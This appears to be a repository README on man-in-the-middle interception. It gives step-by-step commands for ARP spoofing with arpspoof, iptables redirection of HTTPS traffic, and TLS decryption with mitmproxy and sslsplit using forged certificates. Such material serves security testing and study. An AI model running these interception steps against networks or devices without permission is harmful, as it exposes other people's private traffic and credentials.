# mitmtools

system setup and scripts for various mitm activities

## System Setup

arch linux package installs:
```
pacman -S dsniff mitmproxy sslsplit
```

## ARP Spoofing

ARP Spoofing is a form a mitm attack that causes a device on the same network as the attacker to route traffic to the attacker that was intented for another device.

### Enable IP Forwarding
IP Forwarding is required for an ARP Spoofing attack because we need to forward packets on to their correct MAC address

enable IP Forwarding at runtime (will revert upon reboot):
```
sysctl net.ipv4.ip_forward=1
```

to enable IP Forwarding permanently create the file `/etc/sysctl.d/30-ipforward.conf` with the following content:
```
net.ipv4.ip_forward=1
net.ipv6.conf.default.forwarding=1
net.ipv6.conf.all.forwarding=1
```

### Disable ICMP redirects

disable at runtime:
```
sysctl -w net.ipv4.conf.all.send_redirects=0
```

to disable ICMP redirects permanently create the file `/etc/sysctl.d/31-icmp-redirect.conf` with the following content:
```
net.ipv4.conf.all.send_redirects=0
```

### Perform ARP Spoof

intercept traffic from A intended for B to your local attacker machine on the I interface (unidirectional mitm):
```
arpspoof -i I -t A B
```
e.g. to intercept traffic from a device 192.168.1.100 to the gateway 192.168.1.1 on the eth0 interface:
```
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
```
to make the intercept bydirectional, add the `-r` flag:
```
arpspoof -i eth0 -r -t 192.168.1.100 192.168.1.1
```

## mitmproxy

mitmproxy can be used to transparently proxy HTTP data encrypted with TLS. (it will not work with non-HTTP TLS streams!)

### redirect traffic to mitmproxy (running on port 8081) via iptables

redirect traffic to port 443 to mitmproxy running on localhost port 8081
```
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8081
```

### run mitmproxy
```
mitmproxy --mode transparent --showhost -p 8081 -k
```

The first time mitmproxy is run, it generates a CA cert/key pair that are used to sign all forged PKI certificates.

cert location:
```
~/.mitmproxy/mitmproxy-ca-cert.pem
```
This cert needs to be installed and trusted as a CA certificate in whatever web broswer, mobile device, etc that you are trying to attack.
NOTE: also you can not add the cert to a device to test if it is in fact verifying the cert or not.

## sslsplit

sslsplit is used to transparently intercept TLS streams and write the decryped network data to a pcap file. sslsplit has the advantage of working on all TLS payloads, not just HTTP.

### redirect traffic to sslsplit (running on port 8081) via iptables

redirect traffic to port 443 to sslsplit running on localhost port 8081
```
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8081
```

### run sslsplit

generate key and cert:
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365
```

run sslsplit:
```
sslsplit -D -X out.pcap -k key.pem -c cert.pem ssl 127.0.0.1 8081
```
